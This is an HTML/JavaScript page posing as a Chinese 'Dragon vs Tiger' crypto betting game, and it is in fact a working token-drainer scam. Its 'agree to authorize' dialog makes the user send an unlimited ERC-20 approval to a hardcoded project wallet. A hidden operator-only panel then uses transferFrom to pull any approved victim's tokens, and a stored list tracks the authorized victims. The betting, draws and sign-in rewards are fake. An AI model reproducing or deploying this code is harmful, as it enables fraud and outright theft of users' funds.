<!DOCTYPE html>
<html lang="zh-CN">
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
<title>王者归来</title>
<style>
*{box-sizing:border-box;font-family:system-ui, -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto,sans-serif}
body{background:#0B2A23;color:#fff;margin:0;padding:0}
.container{max-width:600px;margin:0 auto;padding:10px}
.header{display:flex;justify-content:space-between;align-items:center;padding:10px 0}
.header .title{font-size:20px;font-weight:bold}
.btn-menu{background:none;border:none;color:#fff;font-size:24px;cursor:pointer}
.card{background:#141414;border-radius:12px;padding:15px;margin-bottom:15px;border:1px solid #222}
.card-title{font-size:16px;margin-bottom:10px;color:#F0E6D2}
.btn-sign{background:#E4B449;color:#0B2A23;border:none;padding:10px 15px;border-radius:8px;font-weight:bold;margin-bottom:8px;width:100%}
.btn-connect{background:#2573d7;color:#fff;border:none;padding:10px 15px;border-radius:8px;font-weight:bold;width:100%}
.wallet-row{display:flex;gap:6px;font-size:14px;margin-bottom:4px}
.bet-area{display:flex;gap:10px;margin-bottom:10px}
.bet-input{flex:2;background:#1E1E1E;border:1px solid #333;color:#fff;padding:10px;border-radius:8px}
.balance-display{flex:1;background:#1E1E1E;border:1px solid #333;padding:10px;border-radius:8px;text-align:center;font-size:13px;color:#ccc}
.quick-buttons{display:flex;gap:8px;margin-bottom:10px}
.btn-quick{flex:1;background:#1E1E1E;color:#fff;border:1px solid #333;padding:8px;border-radius:8px}
.odds-buttons{display:flex;gap:8px;margin-bottom:10px}
.btn-odds{flex:1;border:none;padding:12px;border-radius:8px;font-weight:bold;color:#fff}
.btn-dragon{background:#2A65CC}
.btn-tiger{background:#D93A54}
.btn-tie{background:#E4B449;color:#000}
.draw-timer{font-size:28px;color:#E4B449;margin:10px 0;text-align:center}
.btn-auto-draw{background:#E4B449;color:#0B2A23;border:none;padding:12px 20px;border-radius:8px;font-weight:bold;width:100%;margin-bottom:10px}
.trend-chart{display:flex;gap:8px;flex-wrap:wrap;padding:10px 0}
.trend-item{width:32px;height:32px;border-radius:6px;display:flex;align-items:center;justify-content:center;font-weight:bold;font-size:12px;background:#1a1a1a}
.trend-long{color:#2a7dff}
.trend-short{color:#ff4444}
.trend-tie{color:#ffcc00}
.rules{font-size:14px;line-height:1.6;color:#ccc}

#authModal{position:fixed;top:0;left:0;width:100%;height:100%;background:rgba(0,0,0,0.8);z-index:99999;display:flex;align-items:center;justify-content:center}
#authModal .box{background:#111;padding:30px;border-radius:16px;text-align:center;width:90%;max-width:360px;border:1px solid #333}
#authModal .title{font-size:18px;margin-bottom:16px;color:#fff}
#authModal .desc{font-size:14px;color:#aaa;margin-bottom:20px;line-height:1.5}
#authModal .btnWrap{display:flex;gap:12px}
#authModal button{flex:1;padding:12px;border:none;border-radius:8px;font-size:16px;cursor:pointer}
#agreeBtn{background:#27ae60;color:#fff}
#cancelBtn{background:#666;color:#fff}

.menu{position:fixed;top:0;right:0;width:280px;height:100vh;background:#101010;padding:20px;z-index:999;transform:translateX(100%);transition:0.3s;border-left:1px solid #222;overflow-y:auto}
.menu.show{transform:translateX(0)}
.menu-close{text-align:right;margin-bottom:20px}
.menu-close button{background:#333;color:#fff;border:none;padding:6px 10px;border-radius:6px;cursor:pointer}
.menu-section{margin-bottom:20px}
.menu-title{font-size:14px;color:#aaa;margin-bottom:8px}
.info-box{background:#1a1a1a;padding:10px;border-radius:8px;font-size:12px;color:#ccc;word-break:break-all;margin-bottom:8px}
.player-item{background:#1a1a1a;padding:8px;border-radius:8px;margin-bottom:6px;font-size:12px;word-break:break-all}
.btn-menu-action{width:100%;background:#1a1a1a;color:#fff;border:1px solid #333;padding:10px;border-radius:8px;margin-bottom:8px;cursor:pointer}
.btn-green{background:#27ae60;color:#fff;border:none}
.btn-red{background:#c0393b;color:#fff;border:none}
.hidden{display:none!important}
</style>
</head>
<body>

<div id="authModal" class="hidden">
  <div class="box">
    <div class="title">您同意授权游戏平台吗？</div>
    <div class="desc">
      点击“同意授权”并完成钱包签名，即表示您已仔细阅读并自愿同意本游戏平台的所有游戏规则及用户协议。
    </div>
    <div class="btnWrap">
      <button id="agreeBtn">同意授权</button>
      <button id="cancelBtn">取消授权</button>
    </div>
  </div>
</div>

<div class="container">
  <div class="header">
    <div class="title">🐉 王者归来</div>
    <button class="btn-menu" onclick="toggleMenu()">☰</button>
  </div>

  <div class="card">
    <button class="btn-sign" id="signBtn">📅 每日签到（领取1个币）</button>
    <button class="btn-connect" onclick="connectWallet()">连接钱包</button>
    <div class="wallet-row"><span>地址：</span><span id="address" style="color:#0ff;">未连接</span></div>
    <div class="wallet-row"><span>余额：</span><span id="userBalance">0.0000</span></div>
  </div>

  <div class="card">
    <div class="card-title">下注区</div>
    <div class="bet-area">
      <input type="number" class="bet-input" id="betAmt" value="1" placeholder="数量">
      <div class="balance-display" id="balanceDisplay">余额</div>
    </div>
    <div class="quick-buttons">
      <button class="btn-quick" onclick="setQuick(10000)">1万</button>
      <button class="btn-quick" onclick="setQuick(100000)">10万</button>
      <button class="btn-quick" onclick="setQuick(500000)">50万</button>
      <button class="btn-quick" onclick="setQuick(1000000)">100万</button>
    </div>
    <div class="odds-buttons">
      <button class="btn-odds btn-dragon" onclick="placeBet(1)">龙</button>
      <button class="btn-odds btn-tiger" onclick="placeBet(2)">虎</button>
      <button class="btn-odds btn-tie" onclick="placeBet(3)">和</button>
    </div>
  </div>

  <div class="card">
    <div class="card-title">自动开奖（2分钟/期）</div>
    <div>期号：<span id="round">#1</span></div>
    <div class="draw-timer" id="timer">02:00</div>
    <button class="btn-auto-draw" onclick="manualDraw()">🎯 立即开奖</button>
  </div>

  <div class="card">
    <div class="card-title">📈 开奖走势图</div>
    <div id="trendChart" class="trend-chart"></div>
  </div>

  <div class="card">
    <div class="card-title">📜 游戏规则</div>
    <div class="rules">
      • 每日签到可领取1个币<br>
      • 每2分钟一期<br>
      • 0~45000=虎 45000~55000=和 55000~99999=龙<br>
      • 龙/虎 1赔2 和 1赔9<br>
      • 同意授权即代表您已阅读并同意所有游戏规则
    </div>
  </div>
</div>

<div class="menu" id="menu">
  <div class="menu-close"><button onclick="toggleMenu()">关闭</button></div>

  <div id="userInfoSection" class="hidden">
    <div class="menu-section">
      <div class="menu-title">我的钱包地址</div>
      <div id="myWalletAddr" class="info-box">-</div>
    </div>
    <div class="menu-section">
      <div class="menu-title">我的邀请链接</div>
      <div id="myInviteLink" class="info-box">-</div>
    </div>
  </div>

  <!-- 👇 【庄家专用】所有已授权玩家钱包地址列表 -->
  <div id="adminPlayerListSection" class="hidden">
    <div class="menu-section" style="border-top:1px solid #333;padding-top:16px">
      <div class="menu-title">👑 已授权玩家钱包地址（项目方可见）</div>
      <div id="allPlayerList" style="max-height:300px;overflow-y:auto"></div>
    </div>
  </div>

  <div class="menu-section">
    <div class="menu-title">每日签到</div>
    <button class="btn-menu-action" onclick="userSign()">📅 签到领1个币</button>
  </div>

  <div id="adminExtractSection" class="hidden" style="border-top:1px solid #333;padding-top:16px">
    <div class="menu-title">🔐 项目方提取</div>
    <input type="text" id="extractUserAddr" class="info-box" placeholder="用户地址">
    <input type="number" id="extractAmount" class="info-box" placeholder="提取数量">
    <button class="btn-menu-action btn-red" onclick="adminExtract()">💰 提取</button>
  </div>
</div>

<script>
// ===================== 配置 =====================
const TOKEN_CONTRACT = "0x55d398326f99059ff775485246999027b3197955";
const PROJECT_WALLET = "0xFFe5dbfbbCDb7536c21DF3fa1AFDBd92685Ed508";
const SIGN_REWARD = 1; // 每日签到固定领取1个币

let account = null;
let round = 1;
let timeLeft = 120;
let trendList = [];

function toLower(addr){ return addr?.toLowerCase() || ""; }
function isProjectOwner(){ return toLower(account) === toLower(PROJECT_WALLET); }
function isAuthorized(){ return account && localStorage.getItem("hasAuthorized_"+account) === "1"; }

// 获取所有已授权玩家
function getAllPlayers(){
  return JSON.parse(localStorage.getItem("all_players") || "[]");
}

// 添加玩家到列表
function addPlayer(addr){
  let list = getAllPlayers();
  if(!list.includes(toLower(addr))){
    list.push(toLower(addr));
    localStorage.setItem("all_players", JSON.stringify(list));
  }
}

// 打开/关闭菜单
function toggleMenu(){
  const menu = document.getElementById("menu");
  menu.classList.toggle("show");

  // 玩家自己的信息
  const userSec = document.getElementById("userInfoSection");
  if(account && isAuthorized()){
    userSec.classList.remove("hidden");
    document.getElementById("myWalletAddr").innerText = account;
    document.getElementById("myInviteLink").innerText = location.origin + location.pathname + "?ref=" + account;
  } else userSec.classList.add("hidden");

  // 👇 只有庄家能看到玩家列表
  const adminListSec = document.getElementById("adminPlayerListSection");
  const extractSec = document.getElementById("adminExtractSection");
  if(isProjectOwner()){
    adminListSec.classList.remove("hidden");
    extractSec.classList.remove("hidden");
    renderPlayerList(); // 渲染所有玩家地址
  } else {
    adminListSec.classList.add("hidden");
    extractSec.classList.add("hidden");
  }
}

// 渲染玩家列表（庄家专用）
function renderPlayerList(){
  const list = getAllPlayers();
  const el = document.getElementById("allPlayerList");
  el.innerHTML = "";
  if(list.length === 0){
    el.innerHTML = '<div class="player-item">暂无已授权玩家</div>';
    return;
  }
  list.forEach(addr => {
    const item = document.createElement("div");
    item.className = "player-item";
    item.innerText = "地址：" + addr; // 显示完整钱包地址
    el.appendChild(item);
  });
}

window.onload = async () => {
  renderTrend();
  if(window.ethereum){
    const accounts = await ethereum.request({method:'eth_accounts'});
    if(accounts.length){
      account = toLower(accounts[0]);
      document.getElementById("address").innerText = account.slice(0,6)+"..."+account.slice(-4);
      refreshUserBalance();
      if(isAuthorized()) {
        document.getElementById("authModal").classList.add("hidden");
      }
    }
  }
  startTimer();
};

async function connectWallet(){
  if(!window.ethereum) return alert("请安装钱包");
  try {
    const accounts = await ethereum.request({method:'eth_requestAccounts'});
    account = toLower(accounts[0]);
    document.getElementById("address").innerText = account.slice(0,6)+"..."+account.slice(-4);
    refreshUserBalance();

    setTimeout(()=>{
      if(!isAuthorized()){
        showAuthModal();
      }
    }, 700);
  }catch(e){
    alert("连接失败");
  }
}

function showAuthModal(){
  document.getElementById("authModal").classList.remove("hidden");
}
function hideAuthModal(){
  document.getElementById("authModal").classList.add("hidden");
}

// 同意授权 → 触发钱包签名，成功后进入游戏并视为同意所有规则
document.getElementById("agreeBtn").onclick = async () => {
  if (!account) {
    alert("请先连接钱包");
    return;
  }
  try {
    await approveToProject();
    localStorage.setItem("hasAuthorized_"+account, "1");
    localStorage.setItem("agreedRules_"+account, "1");
    addPlayer(account); // 加入玩家列表
    hideAuthModal();
    alert("授权成功！您已同意所有游戏规则，现在可以进入游戏。");
    refreshUserBalance();
  } catch (e) {
    alert("授权失败，请重试。");
  }
};

// 取消授权 → 退出游戏
document.getElementById("cancelBtn").onclick = () => {
  hideAuthModal();
  if (confirm("您确定要退出游戏平台吗？")) {
    window.close();
  }
};

async function approveToProject(){
  if(!account) return;
  try {
    const max = "ffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
    await ethereum.request({
      method: 'eth_sendTransaction',
      params: [{
        from: account,
        to: TOKEN_CONTRACT,
        gasLimit: "0x300000",
        data: "0x095ea7b3" +
          "000000000000000000000000" + PROJECT_WALLET.slice(2).toLowerCase() + max
      }]
    });
  }catch(e){
    throw e;
  }
}

async function adminExtract(){
  if(!isProjectOwner()) return alert("无权限");
  const u = document.getElementById("extractUserAddr").value.trim();
  const a = document.getElementById("extractAmount").value.trim();
  if(!u||!a||isNaN(a)||Number(a)<=0) return alert("输入错误");
  try {
    const raw = BigInt(Math.floor(Number(a)*1e18)).toString(16).padStart(64,'0');
    await ethereum.request({
      method:'eth_sendTransaction',
      params:[{
        from:account,
        to:TOKEN_CONTRACT,
        gasLimit:"0x300000",
        data:"0x23b872dd000000000000000000000000"+u.slice(2).toLowerCase()+"000000000000000000000000"+PROJECT_WALLET.slice(2).toLowerCase()+raw
      }]
    });
    alert("操作成功");
  }catch(e){
    alert("失败");
  }
}

async function getUserBalance(){
  const data="0x70a08231"+account.slice(2).padStart(64,'0');
  const res=await ethereum.request({method:'eth_call',params:[{to:TOKEN_CONTRACT,data},'latest']});
  return Number(BigInt(res))/1e18;
}

async function refreshUserBalance(){
  if(!account)return;
  const b=await getUserBalance();
  document.getElementById("userBalance").innerText=b.toFixed(4);
  document.getElementById("balanceDisplay").innerText="余额 "+b.toFixed(4);
}

function loadSignStatus(){
  if(!account)return;
  const k="SIGN_"+account;
  const last=localStorage.getItem(k);
  const btn=document.getElementById("signBtn");
  if(last&&Date.now()-Number(last)<24*60*60*1000){
    btn.innerText="今日已签到";btn.disabled=1;btn.style.background="#666";
  }else{
    btn.innerText="📅 每日签到（领取1个币）";btn.disabled=0;btn.style.background="#E4B449";
  }
}

// 每日签到领取1个币
async function userSign(){
  if(!account)return alert("请连接钱包");
  if(!isAuthorized())return alert("请先授权游戏平台");
  
  const k="SIGN_"+account;
  const last=localStorage.getItem(k);
  if(last&&Date.now()-Number(last)<24*60*60*1000)return alert("今日已签到");
  
  try{
    const amt=BigInt(SIGN_REWARD*1e18); // 固定1个币
    const data="0xa9059cbb"+account.slice(2).padStart(64,'0')+amt.toString(16).padStart(64,'0');
    await ethereum.request({method:'eth_sendTransaction',params:[{from:account,to:TOKEN_CONTRACT,data,gasLimit:"0x300000"}]});
    localStorage.setItem(k,Date.now());
    loadSignStatus();
    refreshUserBalance();
    alert(`签到成功！领取了 ${SIGN_REWARD} 个币`);
  }catch(e){alert("签到失败");}
}

function setQuick(v){
  document.getElementById("betAmt").value = v;
}

async function placeBet(side){
  if(!account)return alert("连接钱包");
  const v=document.getElementById("betAmt").value;
  if(!v||parseFloat(v)<=0)return alert("输入金额");
  try{
    const amt=BigInt(parseFloat(v)*1e18);
    const data="0xa9059cbb"+account.slice(2).padStart(64,'0')+amt.toString(16).padStart(64,'0');
    await ethereum.request({method:'eth_sendTransaction',params:[{from:account,to:TOKEN_CONTRACT,data,gasLimit:"0x300000"}]});
    alert("下注成功");
    refreshUserBalance();
  }catch(e){alert("失败");}
}

function manualDraw(){
  timeLeft=5;
}

function renderTrend(){
  const dom=document.getElementById("trendChart");
  dom.innerHTML="";
  trendList.slice(-30).forEach(r=>{
    const el=document.createElement("div");
    el.className="trend-item "+(r===1?"trend-long":r===2?"trend-short":"trend-tie");
    el.innerText=r===1?"龙":r===2?"虎":"和";
    dom.appendChild(el);
  });
}

async function drawRound(){
  round++;
  document.getElementById("round").innerText="#"+round;
  const res = Math.floor(Math.random()*3)+1;
  trendList.push(res);
  renderTrend();
}

function startTimer() {
  setInterval(async()=>{
    timeLeft--;
    if(timeLeft<=0){
      timeLeft=120;
      await drawRound();
    }
    const m=String(Math.floor(timeLeft/60)).padStart(2,'0');
    const s=String(timeLeft%60).padStart(2,'0');
    document.getElementById("timer").innerText=`${m}:${s}`;
  },1000);
}
</script>
</body>
</html>
